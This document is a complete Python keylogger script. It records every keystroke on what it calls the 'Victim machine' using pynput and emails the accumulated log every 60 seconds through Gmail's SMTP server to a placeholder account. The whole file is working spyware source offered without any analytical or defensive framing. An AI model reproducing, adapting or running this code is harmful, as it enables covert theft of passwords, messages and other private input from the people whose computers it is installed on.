#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, t, emailID, password):
        self.log = "[+] Keylogger Successfully Started in the Victim machine."
        self.interval = t
        self.email = emailID
        self.passwd = password
    def use_keys(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            else:
                self.log += " [" + str(key) + "] "

    def report(self):
        self.mail_it(self.email, self.passwd, self.email, "\n\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def mail_it(self, email, passwd, to_mail, msg):
        mailserver = smtplib.SMTP("smtp.gmail.com", 587)
        mailserver.starttls()
        mailserver.login(email, passwd)
        mailserver.sendmail(email, to_mail, msg)
        mailserver.quit()

    def start(self):
        key_rec = pynput.keyboard.Listener(on_press= self.use_keys)
        with key_rec:
            self.report()
            key_rec.join()

logger = Keylogger(60, "xxxxxxxxxxx@gmail.com", "**********")
logger.start()